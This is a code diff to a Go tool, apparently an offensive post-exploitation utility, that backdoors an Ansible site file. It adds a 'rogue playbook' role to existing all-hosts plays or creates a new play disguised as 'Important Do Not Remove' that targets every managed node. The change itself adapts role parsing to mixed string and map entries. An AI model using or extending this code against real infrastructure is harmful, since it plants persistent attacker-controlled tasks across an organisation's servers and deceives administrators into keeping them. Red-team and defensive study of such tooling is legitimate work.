@@ -5,15 +5,12 @@
 package main
 
 import (
-	"bufio"
-	"errors"
 	"flag"
 	"fmt"
 	"log"
 	"os"
 	"path/filepath"
 	"regexp"
-	"strconv"
 	"strings"
 	"text/template"
 
@@ -47,7 +44,7 @@ type ansible []struct {
 	Become      bool          `json:"become,omitempty"`
 	GatherFacts string        `json:"gather_facts,omitempty"`
 	Include     string        `json:"include,omitempty"`
-	Roles       []string      `json:"roles,flow,omitempty"`
+	Roles       []interface{} `json:"roles,flow,omitempty"`
 	Tasks       []interface{} `json:"tasks,omitempty"`
 }
 
@@ -371,8 +368,21 @@ func writeYamlToSite(siteYaml ansible) {
 func validateIndicies(data ansible) map[int]bool {
 	validIndices := make(map[int]bool, 0)
 	for i, hosts := range data {
+		roles := make([]string, 0)
 		if hosts.Include == "" {
-			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, hosts.Roles)
+			for _, item := range hosts.Roles {
+				switch r := item.(type) {
+				case map[string]interface{}:
+					roles = append(roles, r["role"].(string))
+				case string:
+					roles = append(roles, r)
+				default:
+					if debug {
+						log.Println("Should not make it here in validateIndicies")
+					}
+				}
+			}
+			moseutils.Msg("[%v] Name: %v, Hosts: %v, Roles: %v", i, hosts.Name, hosts.Hosts, roles)
 			validIndices[i] = true
 		}
 	}
@@ -410,7 +420,7 @@ func backdoorSiteFile() {
 				if strings.Compare(item.Hosts, "all") == 0 {
 					moseutils.Msg("Existing configuration for all hosts found, adding rogue playbook to associated roles")
 					if unmarshalled[i].Roles == nil {
-						unmarshalled[i].Roles = make([]string, 0)
+						unmarshalled[i].Roles = make([]interface{}, 0)
 					}
 					unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
 					writeYamlToSite(unmarshalled)
@@ -426,6 +436,8 @@ func backdoorSiteFile() {
 		if debug {
 			log.Printf("No existing configuration for all founds host in %v", files.siteFile)
 		}
+		roles := make([]interface{}, 0)
+		roles = append(roles, ansibleRole)
 		if ans, err := moseutils.AskUserQuestion("Would you like to target all managed nodes? ", a.OsTarget); ans && err == nil {
 			newItem := ansible{{
 				"Important Do Not Remove",
@@ -433,7 +445,7 @@ func backdoorSiteFile() {
 				true,
 				"",
 				"",
-				[]string{ansibleRole},
+				roles,
 				nil,
 			}}
 			unmarshalled = append(unmarshalled, newItem[0])
@@ -451,7 +463,7 @@ func backdoorSiteFile() {
 			// Check if the specified location is in the answer
 			if ans[i] {
 				if unmarshalled[i].Roles == nil {
-					unmarshalled[i].Roles = make([]string, 0)
+					unmarshalled[i].Roles = make([]interface{}, 0)
 				}
 				unmarshalled[i].Roles = append(unmarshalled[i].Roles, ansibleRole)
 			}
